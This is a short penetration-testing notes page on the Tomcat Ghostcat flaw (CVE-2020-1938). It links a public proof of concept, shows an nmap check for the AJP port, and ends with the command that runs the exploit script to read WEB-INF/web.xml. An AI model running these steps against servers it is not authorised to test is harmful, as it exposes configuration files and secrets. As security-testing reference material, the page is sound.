---
icon: cat
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
  metadata:
    visible: true
---

# CVE-2020-1938 (Ghostcat)

Tomcat was found to be vulnerable to an unauthenticated LFI in a semi-recent discovery named [Ghostcat](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938). All Tomcat versions before 9.0.31, 8.5.51, and 7.0.100 were found vulnerable.

{% hint style="info" %}
## Proof of Concept

[https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi)
{% endhint %}

This vulnerability was caused by a misconfiguration in the AJP protocol used by Tomcat. AJP stands for Apache Jserv Protocol, which is a binary protocol used to proxy requests. This is typically used in proxying requests to application servers behind the front-end web servers.

## Confirm AJP Port

The AJP service is usually running at port 8009 on a Tomcat server. This can be checked with a targeted Nmap scan.

{% code title="Command" %}
```bash
nmap -sV -p 8009,8080 app-dev.acme.com
```
{% endcode %}

{% code title="Output" %}
```bash
PORT     STATE SERVICE VERSION
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 9.0.30
```
{% endcode %}

The above scan confirms that ports 8080 and 8009 are open. The PoC code for the vulnerability can be found [here](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi). Download the script and save it locally. The exploit can only read files and folders within the web apps folder, which means that files like `/etc/passwd` canâ€™t be accessed.

## Script Execution

{% code title="Command" %}
```bash
python2.7 tomcat-ajp.lfi.py app-dev.acme.com -p 8009 -f WEB-INF/web.xml 
```
{% endcode %}
